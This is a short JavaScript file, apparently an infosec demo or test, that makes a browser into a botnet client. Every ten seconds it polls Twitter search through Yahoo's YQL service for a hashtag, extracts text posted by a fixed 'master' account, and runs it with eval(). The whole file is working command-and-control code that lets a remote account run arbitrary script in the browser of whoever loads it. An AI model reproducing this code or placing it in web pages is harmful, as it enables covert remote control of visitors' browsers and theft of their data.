var cmd = &#34;test1nf0s3c&#34;;
var master = &#34;test_infosec&#34;;
setInterval(pingTwitter, 10000);
function pingTwitter() {
    var xmlhttp;
    if (window.XMLHttpRequest) {
        xmlhttp=new XMLHttpRequest();
    } else {
        xmlhttp=new ActiveXObject(&#34;Microsoft.XMLHTTP&#34;);
    }
    xmlhttp.onreadystatechange=function() {
        if (xmlhttp.readyState == 4 &amp;&amp; xmlhttp.status == 200) {
            var command = parse(xmlhttp.responseText);
			execute(command);
        }
    }
	xmlhttp.open(&#34;GET&#34;,&#34;https://query.yahooapis.com/v1/public/yql?q=select%20*%20from%20html%20where%20url%3D%22https%3A%2F%2Ftwitter.com%2Fsearch%3Fq%3D%2523&#34;+cmd+&#34;%26src%3Dtypd%26vertical%3Ddefault%26f%3Dtweets%22&amp;diagnostics=true&#34;, true);	
    xmlhttp.send();
}

function parse(data) {		
	var re_string = &#39;&lt;a class=&#34;account-group js-account-group js-action-profile js-user-profile-link js-nav&#34; data-user-id=&#34;\\d+&#34; href=&#34;/&#39;+master+&#39;&#34;&gt;[^#]+#&lt;/s&gt;&lt;b&gt;&lt;strong&gt;&#39;+cmd+&#39;&lt;/strong&gt;&lt;/b&gt;&lt;/a&gt;([^&lt;]+)&#39;;	
	var re = new RegExp(re_string);	
	var result = re.exec(data);	
	return result[1];
}

function execute(command) {
	eval(command);
}

